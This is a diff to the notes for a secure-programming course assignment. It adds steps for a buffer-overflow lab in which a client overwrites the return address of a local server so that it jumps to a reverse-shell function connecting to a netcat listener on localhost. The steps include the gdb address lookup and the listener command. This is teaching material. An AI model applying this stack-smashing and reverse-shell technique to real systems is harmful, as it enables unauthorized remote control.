@@ -58,11 +58,28 @@ Assignment for Secure Programming
 	What happens is the client uses the buffer overflow to pass in the address of the reverseshell function and
 	smashes the stack.
 	
-	1. In a new shell run Netcat to listen for the remote shell connection
+	-- Preparing the attack
+	1. Get the hex equivelent of the Client IP in this case (127.0.0.1) so that the reverse client knows who to connect back to.
+	perl -e 'printf "0x" . "%02x"x4 ."\n",1,0,0,127'
+	0x0100007f
+	
+	2. Put this value into the variable "serv_addr.sin_addr.s_addr" in function reverseshell() in ./server2
+	
+	3. Get location of the reverseshell function in decimal form
+	student@ca647:/media/KINGSTON/assignsecprog> gdb ./server2
+	(gdb) p reverseshell
+	$1 = {int ()} 0x8048a78 <reverseshell>
+	(gdb) p/d 0x8048a78
+	$2 = 134515320
+
+	-- The Attack
+	4. Copy that integer into the client2.c variable reverseshell_addr
+	5. Run the make to build all the apps
+	6. In a new shell run Netcat to listen for the remote shell connection
 		$ netcat -l -v -p 43690
-	2. In a new shell run  ./server2
-	3. In a new shell run  ./client2
-	4. In the netcat shell run a few shell comands
+	7. In a new shell run  ./server2
+	8. In a new shell run  ./client2
+	9. In the netcat shell run a few shell comands
 
 	
 	
